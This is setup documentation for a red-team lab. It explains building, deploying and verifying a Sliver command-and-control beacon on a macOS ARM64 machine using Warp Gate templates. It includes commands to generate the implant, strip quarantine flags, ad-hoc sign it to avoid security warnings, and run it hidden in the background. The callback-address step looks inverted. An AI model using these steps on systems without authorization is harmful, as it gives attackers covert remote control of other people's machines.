# Sliver Packer Build Documentation

## Overview

This document provides instructions for building and testing Sliver C2
framework beacons using the Warp Gate project's Packer templates, specifically
for macOS ARM64 targets.

## Prerequisites

- Docker installed and running
- Warp Gate project cloned and set up
- macOS target machine (ARM64 architecture)
- Network connectivity between Docker container and target machine

## Build Process

### 1. Build the Sliver Docker Image

First, build the Sliver container using Warp Gate's template system:

```bash
# Initialize the Sliver template
export TASK_X_REMOTE_TASKFILES=1
task template-init -- TEMPLATE_NAME=sliver

# Validate the template
task template-validate -- TEMPLATE_NAME=sliver

# Build the Docker image
task template-build \
  -- TEMPLATE_NAME=sliver \
     ONLY='sliver-docker.docker.*' \
     VARS="template_name=sliver"
```

### 2. Get Target Machine IP Address

On your macOS target machine, retrieve the IP address:

```bash
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
```

### 3. Start Sliver Server Container

Launch the Sliver container with exposed ports:

```bash
docker run -it --rm \
  -p 8888:8888 \
  -p 4444:4444 \
  --name sliver-test \
  sliver:latest \
  /bin/bash
```

### 4. Generate and Configure Beacon

Inside the container, start the Sliver server and generate a beacon:

```bash
# Start the Sliver server
/opt/sliver/sliver-server

# In the Sliver console, generate a macOS ARM64 beacon
# Replace IP_ADDRESS with your target machine's IP
sliver > generate beacon --mtls IP_ADDRESS:8888 --os mac --arch arm64 --save /tmp/beacon-macos-arm64

# Start the MTLS listener
sliver > mtls --lhost 0.0.0.0 --lport 8888
```

**Note:** If you encounter symbol obfuscation errors, use the `--skip-symbols` flag:

```bash
sliver > generate beacon --skip-symbols --mtls IP_ADDRESS:8888 --os mac --arch arm64 --save /tmp/beacon-macos-arm64
```

### 5. Deploy Beacon to macOS Target

On your macOS machine, copy the beacon from the container:

```bash
# Copy beacon from container to Desktop
docker cp $(docker ps -q -f ancestor=sliver:latest):/tmp/beacon-macos-arm64 ~/Desktop/beacon-macos-arm64

# Navigate to Desktop
cd ~/Desktop

# Make executable
chmod +x beacon-macos-arm64

# Remove quarantine attributes
xattr -c beacon-macos-arm64

# Sign the binary to avoid macOS security warnings
codesign --force --deep -s - beacon-macos-arm64

# Execute the beacon in background
./beacon-macos-arm64 &
```

### 6. Verify Connection

Back in the Sliver container console:

```bash
# List active beacons
sliver > beacons

# You should see output similar to:
# ID         Name                      Transport   Hostname    Username   Operating System   Last Check-In   Next Check-In
# ========== ========================= =========== =========== ========== ================== =============== ===============
# 62df50e1   CONSTITUTIONAL_EMPLOYEE   mtls        ouroboros   l          darwin/arm64       25s             36s

# Interact with the beacon using its ID
sliver > use BEACON_ID

# Test with a simple command
sliver (BEACON_NAME) > ls
```

## Cleanup

### On macOS Target

Find and terminate the beacon process:

```bash
# Find the beacon process
ps aux | grep beacon

# Kill the beacon process (replace PID with actual process ID)
kill -9 PID
```

## Troubleshooting

### Symbol Obfuscation Error

If you encounter:

```text
[!] rpc error: code = Unknown desc = exit status 1
```

This is typically due to missing dependencies for garble (Go obfuscator). The
root cause is that `git` is not installed in the container, which garble
requires to apply patches during the build process.

**Error details:**

```text
cannot get modified linker: failed to 'git apply' patches: exec: "git": executable file not found in $PATH
```

**Solutions:**

1. **Recommended:** Use `--skip-symbols` flag when generating beacons to bypass
   garble entirely
1. **Alternative:** Install git in the container (requires rebuilding the image
   with git package)
1. **For Packer template fix:** Add git installation to the Sliver Docker
   template provisioning scripts

### Permission Denied for Garble

If garble execution fails with permission denied:

```bash
# Check garble location and permissions
which garble
ls -la $(which garble)

# Ensure proper PATH configuration
export PATH=$HOME/.sliver/go/bin:$PATH
```

### Network Connectivity Issues

1. Verify Docker port mapping is correct
1. Ensure no firewall is blocking ports 8888 and 4444
1. Confirm the target IP address is reachable from the container:

   ```bash
   # From inside container
   ping TARGET_IP
   ```

## Security Considerations

⚠️ **WARNING**: This setup is for testing and development purposes only.

- Always use this in isolated, controlled environments
- Never deploy beacons on production systems without proper authorization
- Be aware of local security policies and regulations
- Clean up all test artifacts after use

## Integration with Warp Gate CI/CD

To automate Sliver builds in your pipeline:

```bash
# Push to GitHub Container Registry
task template-push \
  -- NAMESPACE=your-namespace \
     IMAGE_NAME=sliver \
     GITHUB_TOKEN=$(gh auth token) \
     GITHUB_USER=your-username
```

For local CI testing:

```bash
task run-image-builder-action -- TEMPLATE=sliver
```

## Known Issues

- **Garble dependency:** The current Sliver Docker image lacks `git`, which is
  required for garble (Go obfuscator) to function. Until the template is
  updated, use `--skip-symbols` when generating implants.

## Additional Resources

- [Sliver Documentation](https://github.com/BishopFox/sliver/wiki)
- [Warp Gate Project](https://github.com/CowDogMoo/warpgate)
- [Packer Documentation](https://www.packer.io/docs)
